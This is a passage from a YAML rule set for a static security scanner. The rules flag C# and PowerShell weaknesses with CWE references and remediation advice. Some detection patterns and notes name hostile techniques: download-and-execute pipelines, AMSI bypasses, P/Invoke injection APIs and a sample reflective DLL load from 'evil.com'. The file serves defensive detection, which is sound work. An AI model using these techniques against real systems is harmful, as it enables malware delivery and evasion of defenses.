  Always require and validate signatures.

  References: CVE-2015-9235

  '
---
id: csharp-cwe-613-identity-cookie-lifetime
language: csharp
severity: info
message: 'CWE-613: Long-lived authentication cookies increase compromise risk'
tags:
- security
- authentication
- CWE-613
- OWASP-A07
rule:
  kind: property_assignment
  pattern: ExpireTimeSpan = TimeSpan.FromDays
note: 'Long-lived authentication cookies increase compromise risk.

  Use shorter expiration with sliding refresh.

  References: CWE-613

  '
---
id: csharp-cwe-20-missing-model-validation
language: csharp
severity: info
message: 'CWE-20: Unvalidated input may contain malicious data'
tags:
- security
- input-validation
- CWE-20
- OWASP-A03
rule:
  kind: method_definition
  pattern: (?!ModelState.IsValid)
note: 'Unvalidated input may contain malicious data.

  Check ModelState.IsValid or use [ApiController] auto-validation.

  References: CWE-20

  '
---
id: csharp-cwe-1333-regex-untrusted-pattern
language: csharp
severity: warning
message: 'CWE-1333: Malicious regex patterns can cause ReDoS'
tags:
- security
- input-validation
- CWE-1333
- OWASP-A03
rule:
  kind: object_creation
  pattern: new Regex(userInput)
note: 'Malicious regex patterns can cause ReDoS.

  Use static patterns, set timeout, or use RE2-based engine.

  References: CWE-1333

  '
---
id: csharp-cwe-1333-regex-without-timeout
language: csharp
severity: info
message: 'CWE-1333: Complex patterns can hang indefinitely'
tags:
- security
- input-validation
- CWE-1333
- OWASP-A03
rule:
  kind: object_creation
  pattern: new Regex(pattern)
note: 'Complex patterns can hang indefinitely.

  Use new Regex(pattern, RegexOptions.None, TimeSpan.FromSeconds(1)).

  References: CA2022

  '
---
id: csharp-cwe-601-unvalidated-redirect
language: csharp
severity: warning
message: 'CWE-601: Open redirect enables phishing attacks'
tags:
- security
- input-validation
- CWE-601
- OWASP-A01
rule:
  kind: method_call
  pattern: Redirect(userInput)|RedirectToAction(userInput)
note: 'Open redirect enables phishing attacks.

  Use LocalRedirect() or validate against whitelist.

  References: CA3007, CWE-601

  '
---
id: csharp-cwe-434-file-type-validation-by-extension
language: csharp
severity: info
message: 'CWE-434: File extensions can be spoofed'
tags:
- security
- input-validation
- CWE-434
- OWASP-A04
rule:
  kind: method_call
  pattern: Path.GetExtension(file.FileName)
note: 'File extensions can be spoofed; doesn''t validate content.

  Check file magic bytes/MIME type, scan content.

  References: CWE-434

  '
---
id: csharp-cwe-470-unsafe-reflection
language: csharp
severity: error
message: 'CWE-470: Loading types/assemblies from user input enables code execution'
tags:
- security
- reflection
- CWE-470
- OWASP-A06
rule:
  kind: method_call
  pattern: Type.GetType(userInput)|Assembly.Load(userInput)
note: 'Loading types/assemblies from user input enables code execution.

  Use whitelist of allowed types/assemblies.

  References: CWE-470

  '
---
id: csharp-cwe-209-exception-details-to-user
language: csharp
severity: info
message: 'CWE-209: Stack traces reveal internal structure to attackers'
tags:
- security
- information-disclosure
- CWE-209
- OWASP-A04
rule:
  kind: return_statement
  pattern: return ex.ToString()|return ex.StackTrace
note: 'Stack traces reveal internal structure to attackers.

  Log exception, return generic error message to user.

  References: CWE-209

  '
---
id: csharp-cwe-489-debug-mode-in-production
language: csharp
severity: warning
message: 'CWE-489: Debug mode leaks sensitive information'
tags:
- security
- information-disclosure
- CWE-489
- OWASP-A04
rule:
  kind: property_assignment
  pattern: compilation debug="true"|ASPNETCORE_ENVIRONMENT=Development
note: 'Debug mode leaks sensitive information.

  Ensure debug is false in production deployments.

  References: CWE-489

  '
---
id: csharp-cwe-548-directory-browsing-enabled
language: csharp
severity: info
message: 'CWE-548: Directory listing exposes file structure'
tags:
- security
- information-disclosure
- CWE-548
- OWASP-A04
rule:
  kind: method_call
  pattern: app.UseDirectoryBrowser()
note: 'Directory listing exposes file structure.

  Remove or restrict to specific directories.

  References: CWE-548

  '
---
id: csharp-cwe-209-verbose-database-errors
language: csharp
severity: info
message: 'CWE-209: SQL errors may reveal table/column names'
tags:
- security
- information-disclosure
- CWE-209
- OWASP-A04
rule:
  kind: return_statement
  pattern: return ex.Message
note: 'SQL errors may reveal table/column names.

  Log full error, return generic database error message.

  References: CWE-209

  '
---
id: csharp-cwe-200-server-header-disclosure
language: csharp
severity: info
message: 'CWE-200: Server version aids targeted attacks'
tags:
- security
- information-disclosure
- CWE-200
- OWASP-A04
rule:
  kind: property_assignment
  pattern: Server
note: 'Server version aids targeted attacks.

  Remove or mask server headers.

  References: CWE-200

  '
---
id: csharp-cwe-79-html-raw-user-input
language: csharp
severity: error
message: 'CWE-79: Html.Raw renders HTML without encoding, enabling XSS'
tags:
- security
- xss
- CWE-79
- OWASP-A03
rule:
  kind: method_call
  pattern: '@Html.Raw(Model.UserInput)'
note: 'Html.Raw renders HTML without encoding, enabling XSS.

  Use standard Razor syntax which auto-encodes, or sanitize input.

  References: CA3002, CWE-79

  '
---
id: csharp-cwe-79-javascript-encoding-bypass
language: csharp
severity: warning
message: 'CWE-79: Values in JavaScript context need JS encoding, not HTML'
tags:
- security
- xss
- CWE-79
- OWASP-A03
rule:
  kind: literal
  pattern: <script>var x = '@Model.Value';</script>
note: 'Values in JavaScript context need JS encoding, not HTML.

  Use @Json.Serialize() or JavaScript encoder.

  References: CWE-79

  '
---
id: csharp-cwe-79-response-write-user-data
language: csharp
severity: warning
message: 'CWE-79: Response.Write without encoding enables XSS'
tags:
- security
- xss
- CWE-79
- OWASP-A03
rule:
  kind: method_call
  pattern: Response.Write(userInput)
note: 'Direct writing without encoding enables XSS.

  Use HtmlEncoder.Default.Encode() or Razor templates.

  References: CWE-79

  '
---
id: csharp-cwe-79-content-type-mismatch
language: csharp
severity: info
message: 'CWE-79: Browser may interpret JSON/text as HTML'
tags:
- security
- xss
- CWE-79
- OWASP-A03
rule:
  kind: property_assignment
  pattern: text/html
note: 'Browser may interpret JSON/text as HTML.

  Use correct Content-Type, add X-Content-Type-Options: nosniff.

  References: CWE-79

  '
---
id: csharp-cwe-79-blazor-markupstring
language: csharp
severity: warning
message: 'CWE-79: MarkupString bypasses Blazor''s auto-encoding'
tags:
- security
- xss
- CWE-79
- OWASP-A03
rule:
  kind: object_creation
  pattern: new MarkupString(userInput)
note: 'MarkupString bypasses Blazor''s auto-encoding.

  Sanitize HTML before creating MarkupString.

  References: CWE-79

  '
---
id: csharp-cwe-319-http-instead-of-https
language: csharp
severity: warning
message: 'CWE-319: HTTP traffic can be intercepted and modified'
tags:
- security
- communication
- CWE-319
- OWASP-A02
rule:
  kind: literal
  pattern: http://
note: 'HTTP traffic can be intercepted and modified for sensitive operations.

  Use HTTPS for all communications, enforce via HSTS.

  References: CWE-319

  '
---
id: csharp-cwe-295-certificate-validation-disabled
language: csharp
severity: error
message: 'CWE-295: Disabling certificate validation enables MITM attacks'
tags:
- security
- communication
- CWE-295
- OWASP-A02
rule:
  kind: lambda
  pattern: ServerCertificateValidationCallback = \(s, c, ch, e\) => true
note: 'Disabling certificate validation enables MITM attacks.

  Properly validate certificates, use certificate pinning for sensitive apps.

  References: CA5359, CWE-295

  '
---
id: csharp-cwe-295-obsolete-tls-version
language: csharp
severity: warning
message: 'CWE-295: TLS 1.0/1.1 have known vulnerabilities'
tags:
- security
- communication
- CWE-295
- OWASP-A02
rule:
  kind: property_access
  pattern: SecurityProtocolType.Tls|SslProtocols.Tls11
note: 'TLS 1.0/1.1 have known vulnerabilities.

  Use TLS 1.2 or 1.3: SecurityProtocolType.Tls12 | SecurityProtocolType.Tls13.

  References: CA5364

  '
---
id: csharp-cwe-295-ssl-tls-hardcoded
language: csharp
severity: info
message: 'CWE-295: Hardcoding protocol version prevents future upgrades'
tags:
- security
- communication
- CWE-295
- OWASP-A02
rule:
  kind: property_assignment
  pattern: SecurityProtocol = SecurityProtocolType.Tls12
note: 'Hardcoding prevents future protocol upgrades.

  Use SystemDefault or allow multiple: Tls12 | Tls13.

  References: CA5386

  '
---
id: csharp-cwe-319-mixed-content
language: csharp
severity: info
message: 'CWE-319: HTTP resources loaded in HTTPS page can be modified'
tags:
- security
- communication
- CWE-319
- OWASP-A02
rule:
  kind: literal
  pattern: 'http:'
note: 'HTTP resources loaded in HTTPS page can be modified by attackers.

  Use HTTPS for all resources, use protocol-relative URLs.

  References: CWE-319

  '
---
id: csharp-cwe-90-ldap-injection
language: csharp
severity: warning
message: 'CWE-90: User input in LDAP queries can modify query logic'
tags:
- security
- ldap-injection
- CWE-90
- OWASP-A03
rule:
  kind: binary_expression
  pattern: \(uid=" + username + "\)"
note: 'User input in LDAP queries can modify query logic.

  Escape LDAP special characters: * ( ) \ NUL.

  References: CA3005, CWE-90

  '
---
id: csharp-cwe-90-directoryserializer-user-input
language: csharp
severity: warning
message: 'CWE-90: Unvalidated filter string enables LDAP injection'
tags:
- security
- ldap-injection
- CWE-90
- OWASP-A03
rule:
  kind: property_assignment
  pattern: Filter = userInput
note: 'Unvalidated filter string enables LDAP injection.

  Build filters programmatically or escape special characters.

  References: CWE-90

  '
---
id: csharp-cwe-532-logging-sensitive-data
language: csharp
severity: warning
message: 'CWE-532: Credentials/secrets in logs can be extracted'
tags:
- security
- logging
- CWE-532
- OWASP-A04
rule:
  kind: method_call
  pattern: _logger.LogInformation\(.*password.*\)
note: 'Credentials/secrets in logs can be extracted.

  Never log passwords, tokens, PII. Use structured logging to exclude fields.

  References: CWE-532

  '
---
id: csharp-cwe-778-missing-security-event-logging
language: csharp
severity: info
message: 'CWE-778: Security events must be logged for incident response'
tags:
- security
- logging
- CWE-778
- OWASP-A09
rule:
  kind: method_definition
  pattern: Authentication.*(?!.*[Ll]og)
note: 'Security events must be logged for incident response.

  Log all auth attempts, access control decisions, sensitive operations.

  References: CWE-778

  '
---
id: csharp-cwe-117-log-injection
language: csharp
severity: info
message: 'CWE-117: User input can forge log entries or inject control characters'
tags:
- security
- logging
- CWE-117
- OWASP-A09
rule:
  kind: method_call
  pattern: _logger.LogInformation(userInput)
note: 'User input can forge log entries or inject control characters.

  Sanitize newlines/control chars, use structured logging.

  References: CWE-117

  '
---
id: csharp-cwe-367-toctou-file-exists-check
language: csharp
severity: info
message: 'CWE-367: File can be modified between check and use (TOCTOU)'
tags:
- security
- race-condition
- CWE-367
- OWASP-A01
rule:
  kind: conditional
  pattern: if \(File.Exists\(path\)\) File
note: 'File can be modified between check and use (TOCTOU).

  Handle FileNotFoundException instead of pre-checking.

  References: CWE-367

  '
---
id: csharp-cwe-362-static-shared-state-in-web
language: csharp
severity: warning
message: 'CWE-362: Race conditions in web apps can corrupt state or leak data'
tags:
- security
- race-condition
- CWE-362
- OWASP-A01
rule:
  kind: field_declaration
  pattern: static List<T>
note: 'Race conditions in web apps can corrupt state or leak data.

  Use thread-safe collections or proper locking.

  References: CWE-362

  '
---
id: csharp-cwe-362-session-state-race
language: csharp
severity: info
message: 'CWE-362: Concurrent requests can corrupt session data'
tags:
- security
- race-condition
- CWE-362
- OWASP-A01
rule:
  kind: method_call
  pattern: Session
note: 'Concurrent requests can corrupt session data.

  Use SessionStateBehavior.Required for exclusive access.

  References: CWE-362

  '
---
id: csharp-cwe-942-cors-allow-all-origins
language: csharp
severity: warning
message: 'CWE-942: Allows any website to make authenticated requests'
tags:
- security
- misconfiguration
- CWE-942
- OWASP-A01
rule:
  kind: method_call
  pattern: policy.AllowAnyOrigin\(\)|Access-Control-Allow-Origin:\s*\*
note: 'Allows any website to make authenticated requests.

  Specify exact allowed origins, never use wildcard with credentials.

  References: CWE-942

  '
---
id: csharp-cwe-1021-missing-security-headers
language: csharp
severity: info
message: 'CWE-1021: Security headers prevent various attacks'
tags:
- security
- misconfiguration
- CWE-1021
- OWASP-A01
rule:
  kind: configuration
  pattern: X-Frame-Options|Content-Security-Policy|X-Content-Type-Options
note: 'Security headers prevent various attacks.

  Add security headers via middleware or manually.

  References: CWE-1021

  '
---
id: csharp-cwe-200-insecure-swagger-exposure
language: csharp
severity: info
message: 'CWE-200: API documentation aids attackers'
tags:
- security
- information-disclosure
- CWE-200
- OWASP-A04
rule:
  kind: method_call
  pattern: app.UseSwagger\(\)
note: 'API documentation aids attackers.

  Disable Swagger in production or require authentication.

  References: CWE-200

  '
---
id: csharp-cwe-250-default-database-connection
language: csharp
severity: info
message: 'CWE-250: Default connections may use excessive permissions'
tags:
- security
- misconfiguration
- CWE-250
- OWASP-A01
rule:
  kind: literal
  pattern: Server=localhost;Trusted_Connection=True
note: 'Default connections may use excessive permissions.

  Use least-privilege service accounts.

  References: CWE-250

  '
---
id: csharp-cwe-125-buffer-overread-unsafe
language: csharp
severity: warning
message: 'CWE-125: Unsafe code can read beyond buffer bounds'
tags:
- security
- memory-safety
- CWE-125
- OWASP-A06
rule:
  kind: unsafe_block
  pattern: unsafe\s*\{.*\*\(p\s*\+\s*index\)
note: 'Unsafe code can read beyond buffer bounds.

  Validate indices, prefer Span<T> for bounds-checked access.

  References: CWE-125

  '
---
id: csharp-cwe-770-stackalloc-large-buffer
language: csharp
severity: warning
message: 'CWE-770: User-controlled size can cause stack overflow'
tags:
- security
- memory-safety
- CWE-770
- OWASP-A06
rule:
  kind: method_call
  pattern: stackalloc byte\[userSize\]
note: 'User-controlled size can cause stack overflow.

  Cap size to safe limit (< 1024 bytes), use ArrayPool for larger.

  References: CWE-770

  '
---
id: csharp-cwe-134-format-string-vulnerability
language: csharp
severity: info
message: 'CWE-134: Control format string can cause crashes'
tags:
- security
- memory-safety
- CWE-134
- OWASP-A01
rule:
  kind: method_call
  pattern: String.Format\(userInput\)
note: 'Control format string can cause crashes.

  Always provide format items or use simple string methods.

  References: CWE-134

  '
---
id: csharp-cwe-770-unbounded-collection-growth
language: csharp
severity: warning
message: 'CWE-770: Unbounded growth leads to memory exhaustion'
tags:
- security
- dos
- CWE-770
- OWASP-A04
rule:
  kind: loop
  pattern: while\(true\)\s*list\.Add\(input\)
note: 'Unbounded growth leads to memory exhaustion.

  Set maximum limits on all collections receiving external input.

  References: CWE-770

  '
---
id: csharp-cwe-400-missing-request-size-limit
language: csharp
severity: info
message: 'CWE-400: Large requests can exhaust server resources'
tags:
- security
- dos
- CWE-400
- OWASP-A04
rule:
  kind: attribute
  pattern: RequestSizeLimit|MaxRequestBodySize
note: 'Large requests can exhaust server resources.

  Set RequestSizeLimit attribute or MaxRequestBodySize configuration.

  References: CWE-400

  '
---
id: csharp-cwe-1819-synchronous-io-async-path
language: csharp
severity: info
message: 'CWE-1819: Synchronous IO blocks thread pool threads'
tags:
- security
- dos
- CWE-1819
- OWASP-A04
rule:
  kind: method_call
  pattern: File.ReadAllBytes\(\)
note: 'Synchronous IO blocks thread pool threads, reducing capacity.

  Use File.ReadAllBytesAsync() in async contexts.

  References: CA1849

  '
---
id: csharp-cwe-400-missing-timeout
language: csharp
severity: info
message: 'CWE-400: No timeout allows requests to hang indefinitely'
tags:
- security
- dos
- CWE-400
- OWASP-A04
rule:
  kind: method_call
  pattern: HttpClient.GetAsync\(\)
note: 'No timeout allows requests to hang indefinitely.

  Pass CancellationToken with timeout.

  References: CWE-400

  '
---
id: csharp-cwe-409-zip-bomb
language: csharp
severity: warning
message: 'CWE-409: Compressed files can expand to consume disk/memory'
tags:
- security
- dos
- CWE-409
- OWASP-A04
rule:
  kind: method_call
  pattern: ZipFile.ExtractToDirectory\(\)
note: 'Compressed files can expand to consume disk/memory.

  Check uncompressed size before extraction, set limits.

  References: CWE-409

  '
---
id: csharp-cwe-798-connection-string-in-code
language: csharp
severity: error
message: 'CWE-798: Secrets in source code persist in version control'
tags:
- security
- secrets
- CWE-798
- OWASP-A07
rule:
  kind: literal
  pattern: 'connectionString\\s*=\\s*[\"'']Server=.*Password

    '
note: 'Secrets in source code persist in version control.

  Use User Secrets, environment variables, or secret managers.

  References: CWE-798

  '
---
id: csharp-cwe-798-api-key-in-code
language: csharp
severity: error
message: 'CWE-798: API keys in code can be extracted from binaries/repos'
tags:
- security
- secrets
- CWE-798
- OWASP-A07
rule:
  kind: literal
  pattern: 'apiKey\\s*=\\s*[\"'']sk-|token\\s*=\\s*[\"'']ghp_

    '
note: 'API keys in code can be extracted from binaries/repos.

  Use secret management services.

  References: CWE-798

  '
---
id: csharp-cwe-321-private-key-in-code
language: csharp
severity: error
message: 'CWE-321: Private keys should never be in source code'
tags:
- security
- secrets
- CWE-321
- OWASP-A07
rule:
  kind: literal
  pattern: '-----BEGIN PRIVATE KEY-----'
note: 'Private keys should never be in source code.

  Store in secure key vault with proper access controls.

  References: CWE-321

  '
---
id: csharp-cwe-532-secrets-in-logs-exceptions
language: csharp
severity: warning
message: 'CWE-532: Secrets in error messages may be logged'
tags:
- security
- secrets
- CWE-532
- OWASP-A04
rule:
  kind: throw_statement
  pattern: throw.*secret|throw.*password
note: 'Secrets in error messages may be logged.

  Scrub sensitive data before throwing exceptions.

  References: CWE-532

  '
---
id: csharp-cwe-862-missing-authorization-attribute
language: csharp
severity: warning
message: 'CWE-862: Endpoints may be accessible without authentication'
tags:
- security
- authorization
- CWE-862
- OWASP-A01
rule:
  kind: class_definition
  pattern: Controller.*(?!\[Authorize\])
note: 'Endpoints may be accessible without authentication.

  Apply [Authorize] globally or per-controller, use [AllowAnonymous] explicitly.

  References: CWE-862

  '
---
id: csharp-cwe-342-insecure-kestrel-configuration
language: csharp
severity: info
message: 'CWE-342: Direct Kestrel exposure lacks reverse proxy protections'
tags:
- security
- misconfiguration
- CWE-342
- OWASP-A01
rule:
  kind: method_call
  pattern: Kestrel.Listen\(IPAddress.Any\)
note: 'Direct Kestrel exposure lacks reverse proxy protections.

  Use NGINX/IIS as reverse proxy, configure request limits.

  References: ASP.NET Core Security

  '
---
id: csharp-cwe-20-disabled-model-binding-validation
language: csharp
severity: info
message: 'CWE-20: Disabling validation removes input protection'
tags:
- security
- input-validation
- CWE-20
- OWASP-A03
rule:
  kind: attribute
  pattern: SuppressModelStateInvalidFilter
note: 'Disabling validation removes input protection.

  Apply selectively, manually validate where disabled.

  References: CWE-20

  '
---
id: csharp-cwe-613-insecure-session-configuration
language: csharp
severity: info
message: 'CWE-613: Long session timeouts increase hijacking risk'
tags:
- security
- authentication
- CWE-613
- OWASP-A07
rule:
  kind: property_assignment
  pattern: IdleTimeout = TimeSpan.MaxValue
note: 'Long session timeouts increase hijacking risk.

  Use reasonable timeout (20-30 minutes) with sliding expiration.

  References: CWE-613

  '
---
id: csharp-cwe-770-missing-rate-limiting
language: csharp
severity: info
message: 'CWE-770: Allows brute force and DoS attacks'
tags:
- security
- dos
- CWE-770
- OWASP-A04
rule:
  kind: attribute
  pattern: RateLimit
note: 'Allows brute force and DoS attacks on high-risk endpoints.

  Use AspNetCoreRateLimit or built-in rate limiting middleware.

  References: CWE-770

  '
---
id: csharp-cwe-79-blazor-server-prerender-xss
language: csharp
severity: warning
message: 'CWE-79: Prerendered content not subject to interactive validation'
tags:
- security
- xss
- CWE-79
- OWASP-A03
rule:
  kind: attribute
  pattern: '@Page.*RenderMode.*Server'
note: 'Prerendered content not subject to interactive validation.

  Validate/encode data before prerendering.

  References: Blazor Security

  '
---
id: csharp-cwe-200-blazor-wasm-secret-exposure
language: csharp
severity: error
message: 'CWE-200: WASM runs in browser; all code is extractable'
tags:
- security
- secrets
- CWE-200
- OWASP-A04
rule:
  kind: literal
  pattern: secret|apiKey|password
note: 'WASM runs in browser; all code is extractable.

  Never include secrets in WASM; call secure backend APIs.

  References: CWE-200

  '
---
id: csharp-cwe-94-blazor-ijsruntime-injection
language: csharp
severity: error
message: 'CWE-94: JavaScript execution from user input'
tags:
- security
- code-injection
- CWE-94
- OWASP-A03
rule:
  kind: method_call
  pattern: JS.InvokeVoidAsync\("eval", userInput\)
note: 'JavaScript execution from user input.

  Never pass user input to eval or similar functions.

  References: CWE-94

  '
---
id: powershell-cwe-95-scriptblock-create
language: powershell
severity: error
message: 'CWE-95: ScriptBlock::Create with user input enables code injection'
tags:
- security
- code-execution
- CWE-95
- MITRE-T1059.001
rule:
  kind: method_call
  pattern: \[scriptblock\]::Create\(.*\$
note: 'Creating scriptblocks from untrusted strings bypasses security controls and
  enables code injection.

  ScriptBlock::Create compiles string input into executable code at runtime.


  Remediation:

  - Use pre-defined scriptblocks with parameter substitution

  - Pass user input as scriptblock parameters, not script content

  - Validate all inputs before scriptblock creation

  - Implement constrained language mode

  - Use signed scripts only

  '
---
id: powershell-cwe-78-add-type-pinvoke
language: powershell
severity: error
message: 'CWE-78: Add-Type enables execution of arbitrary C# and P/Invoke calls'
tags:
- security
- code-execution
- CWE-78
- MITRE-T1055
rule:
  kind: command_invocation
  pattern: Add-Type\s+(-TypeDefinition|-MemberDefinition).*(kernel32|user32|advapi32|ntdll)
note: 'Add-Type compiles and loads .NET code at runtime, enabling attackers to access
  Windows APIs,

  bypass security controls, inject shellcode, or execute malware.


  Common abuse patterns:

  - Kernel32.dll for VirtualAlloc, CreateRemoteThread, WriteProcessMemory

  - User32.dll for keylogging (GetAsyncKeyState)

  - Advapi32.dll for token manipulation


  Remediation:

  - Pre-compile required assemblies and deploy them securely

  - Block Add-Type in constrained language mode

  - Implement application control to prevent code compilation

  - Use existing .NET types rather than P/Invoke

  - Require code signing for Add-Type usage

  '
---
id: powershell-cwe-78-start-process-injection
language: powershell
severity: error
message: 'CWE-78: Start-Process with dynamic arguments enables command injection'
tags:
- security
- code-execution
- CWE-78
- MITRE-T1059
rule:
  kind: command_invocation
  pattern: Start-Process.*(-ArgumentList|-)\s*\$
note: 'Start-Process with unvalidated user input in process arguments can lead to
  arbitrary command execution.

  Attackers exploit this to inject commands into the argument list.


  Remediation:

  - Validate and sanitize all input strictly

  - Implement strict allowlists for permitted executables

  - Avoid shell expansion in argument lists

  - Use explicit array syntax for arguments

  - Avoid concatenating user input into command strings

  '
---
id: powershell-cwe-94-invoke-command-remote-dynamic
language: powershell
severity: error
message: 'CWE-94: Invoke-Command with dynamic scriptblocks enables remote code execution'
tags:
- security
- code-execution
- CWE-94
- MITRE-T1021.006
- MITRE-T1570
rule:
  kind: command_invocation
  pattern: Invoke-Command\s+(-ComputerName|-).*-ScriptBlock\s+\[scriptblock\]::Create
note: 'Combining remote execution with dynamic scriptblocks enables lateral movement
  attacks and RCE.

  Attackers can execute arbitrary code on remote systems by injecting malicious scriptblocks.


  Remediation:

  - Use only pre-defined scriptblocks

  - Implement Just Enough Administration (JEA)

  - Validate and allowlist computer names

  - Use constrained scriptblocks

  - Enable script block logging to detect abuse

  - Restrict remoting endpoints to specific operations

  '
---
id: powershell-cwe-95-downloadstring-execute
language: powershell
severity: error
message: 'CWE-95: DownloadString followed by code execution downloads and executes
  remote malware'
tags:
- security
- malware-distribution
- CWE-95
- MITRE-T1105
- MITRE-T1059.001
rule:
  kind: pipeline
  pattern: (New-Object Net.WebClient|iwr|Invoke-WebRequest).*DownloadString.*\|.*(Invoke-Expression|iex|&)
note: 'The classic malware distribution pattern: download code from the internet and
  execute it without verification.

  This is the primary attack vector for initial malware delivery.


  Remediation:

  - Download to file first, then verify cryptographic hash

  - Implement certificate pinning for HTTPS connections

  - Use only HTTPS, never HTTP

  - Implement URL allowlisting

  - Disable execution of downloaded scripts

  - Educate users not to trust downloaded code

  - Monitor outbound network connections for suspicious patterns

  '
---
id: powershell-cwe-95-downloadfile
language: powershell
severity: warning
message: 'CWE-95: File downloads from remote sources may contain malware'
tags:
- security
- malware-distribution
- CWE-95
- MITRE-T1105
- LOLBAS
rule:
  kind: command_invocation
  pattern: (DownloadFile|Invoke-WebRequest.*-OutFile|Start-BitsTransfer)
note: 'Downloaded files may contain malware or malicious scripts without verification.

  Attackers commonly use this to deliver malware.


  Remediation:

  - Verify file hashes against trusted sources

  - Scan downloaded files with AV/YARA

  - Implement URL allowlisting

  - Use HTTPS only

  - Quarantine downloaded files

  - Monitor for suspicious downloads

  '
---
id: powershell-cwe-94-invoke-restmethod-execute
language: powershell
severity: error
message: 'CWE-94: Invoke-RestMethod piped to code execution downloads and executes
  remote code'
tags:
- security
- code-execution
- CWE-94
- MITRE-T1071.001
rule:
  kind: pipeline
  pattern: (Invoke-RestMethod|irm).*\|.*(Invoke-Expression|iex)
note: 'REST API responses piped directly to Invoke-Expression for remote code execution.

  Even API calls that appear legitimate can deliver malicious payloads.


  Remediation:

  - Parse API responses as data structures, never execute directly

  - Validate and sanitize all API responses

  - Implement strict schema validation

  - Use JSON parsing, not code execution

  - Monitor for suspicious API endpoints

  '
---
id: powershell-cwe-95-system-net-http
language: powershell
severity: warning
message: 'CWE-95: Low-level HTTP requests often used to evade detection'
tags:
- security
- code-execution
- CWE-95
- MITRE-T1071.001
rule:
  kind: method_call
  pattern: \[System\.Net\.(HttpWebRequest|WebRequest)\]
note: 'Low-level HTTP requests via .NET classes bypass PowerShell logging and detection.

  Attackers use this to evade cmdlet-level monitoring.


  Remediation:

  - Monitor .NET API calls via ETW

  - Implement behavioral detection for suspicious network patterns

  - Use network egress controls

  - Whitelist legitimate destinations

  '
---
id: powershell-cwe-95-reflection-assembly-load
language: powershell
severity: error
message: 'CWE-95: Reflective assembly loading enables fileless malware'
tags:
- security
- code-execution
- CWE-95
- MITRE-T1620
- MITRE-T1055
rule:
  kind: method_call
  pattern: \[Reflection\.Assembly\]::Load(\$|.*http)
note: 'Loading assemblies from byte arrays or remote URLs enables fileless malware
  attacks.

  Reflective loading bypasses disk-based detection and leaves minimal forensic artifacts.


  Common patterns:

  - [Reflection.Assembly]::Load($bytes)

  - [Reflection.Assembly]::LoadFrom("http://evil.com/malware.dll")

  - In-memory execution of downloaded DLLs


  Remediation:

  - Block reflective assembly loading

  - Monitor .NET assembly load events (ETW)

  - Implement application control

  - Use Code Integrity to restrict DLL loading

  '
---
id: powershell-cwe-798-convertto-securestring-plaintext
language: powershell
severity: error
message: 'CWE-798: ConvertTo-SecureString with -AsPlainText defeats secure string
  purpose'
tags:
- security
- credential-handling
- CWE-798
rule:
  kind: command_invocation
  pattern: ConvertTo-SecureString.*-AsPlainText
note: 'Converting plaintext to SecureString with -AsPlainText defeats the entire purpose
  of secure strings.

  This pattern indicates hardcoded secrets in scripts.


  Remediation:

  - Use Get-Credential to prompt users

  - Store credentials in Windows Credential Manager

  - Use Azure Key Vault for cloud scenarios

  - Use environment variables for CI/CD

  - Never hardcode passwords in scripts

  - Use SecretManagement module for secret storage

  '
---
id: powershell-cwe-798-plaintext-credentials
language: powershell
severity: error
message: 'CWE-798: Plaintext credentials in variables are exposed in memory and logs'
tags:
- security
- credential-handling
- CWE-798
- CWE-312
rule:
  kind: assignment
  pattern: '\\$(password|secret|apikey|token|password_plain)\\s*=\\s*[''\"].*[''\"]

    '
note: 'Credentials stored in plaintext variables are exposed in memory, logs, and
  process snapshots.

  Script block logging and memory dumps reveal plaintext credentials.


  Remediation:

  - Use environment variables from secure storage

  - Implement SecretManagement module

  - Never hardcode credentials

  - Use credential objects (PSCredential)

  - Implement credential rotation

  - Monitor for credential exposure in logs

  '
---
id: powershell-cwe-214-credential-command-line
language: powershell
severity: error
message: 'CWE-214: Credentials on command line are logged and visible to other processes'
tags:
- security
- credential-handling
- CWE-214
rule:
  kind: command_invocation
  pattern: '(-Password|/user:)\\s+[''\"].*[''\"]

    '
note: 'Credentials passed on command lines are logged by Windows and visible to other
  processes.

  Process monitoring tools and log aggregation expose credentials.


  Remediation:

  - Use credential objects instead of passing passwords

  - Use environment variables for sensitive data

  - Implement secure input methods

  - Never use plain text passwords in command arguments

  '
---
id: powershell-cwe-312-export-clixml-credentials
language: powershell
severity: warning
message: 'CWE-312: Exported credentials are decryptable by same user on same machine'
tags:
- security
- credential-handling
- CWE-312
rule:
  kind: pipeline
  pattern: \$.*cred.*\|.*Export-Clixml
note: 'Exporting credentials via Export-Clixml encrypts them with DPAPI, but they''re
  still vulnerable.

  If an attacker obtains the XML file on the original system, they can be decrypted.


  Remediation:

  - Use proper secrets management solutions

  - Understand DPAPI limitations

  - Protect the machine from lateral movement

  - Use Credential Guard

  - Implement hardware-backed secrets storage

  '
---
id: powershell-cwe-312-get-credential-variable
language: powershell
severity: warning
message: 'CWE-312: Storing credentials in variables keeps them in memory longer'
tags:
- security
- credential-handling
- CWE-312
rule:
  kind: assignment
  pattern: \$\w+\s*=\s*Get-Credential
note: 'Storing credentials in variables increases the exposure window.

  Long-lived credential variables remain in memory and are accessible to malware.


  Remediation:

  - Use credentials immediately and clear variables after use

  - Implement short credential lifetimes

  - Use finally blocks to ensure cleanup

  - Call [GC]::Collect() after clearing credentials

  '
---
id: powershell-cwe-94-amsi-bypass-reflection
language: powershell
severity: error
message: 'CWE-94: AMSI bypass via reflection disables malware detection'
tags:
- security
- defense-evasion
- CWE-94
- MITRE-T1562.001
rule:
  kind: method_call
  pattern: (amsiInitFailed|AmsiUtils|amsiContext|AmsiScanBuffer)
note: 'AMSI (Antimalware Scan Interface) bypasses disable malware detection in PowerShell.

  These patterns indicate deliberate disabling of security controls.


  Common techniques:

  - Setting amsiInitFailed to true

  - Nullifying amsiContext pointer

  - Patching AmsiScanBuffer with P/Invoke

  - String concatenation obfuscation: ''Am''+''si''+''Utils''


  Remediation:

  - Alert SOC immediately upon detection

  - Investigate script source and delivery method

  - Block execution of detected scripts

  - Use Process Exclusion settings to prevent tampering

  - Implement behavioral detection for reflective operations

  '
---
id: powershell-cwe-94-reflection-nonpublic-members
language: powershell
severity: error
message: 'CWE-94: Reflection to access non-public members indicates bypass attempts'
tags:
- security
- defense-evasion
- CWE-94
- MITRE-T1562
rule:
  kind: method_call
  pattern: (GetField|GetMethod).*NonPublic
note: 'Accessing private fields and methods via reflection is often used to disable
  security controls.

  This pattern is strong indicator of malicious intent.


  Remediation:

  - Monitor reflection usage

  - Block in constrained language mode

  - Use ETW to detect reflection abuse

  - Implement application control

  - Use AppLocker to restrict reflection usage

  '
---
id: powershell-cwe-94-string-concatenation-obfuscation
language: powershell
severity: warning
message: 'CWE-94: String concatenation evades signature-based detection'
tags:
- security
- defense-evasion
- CWE-94
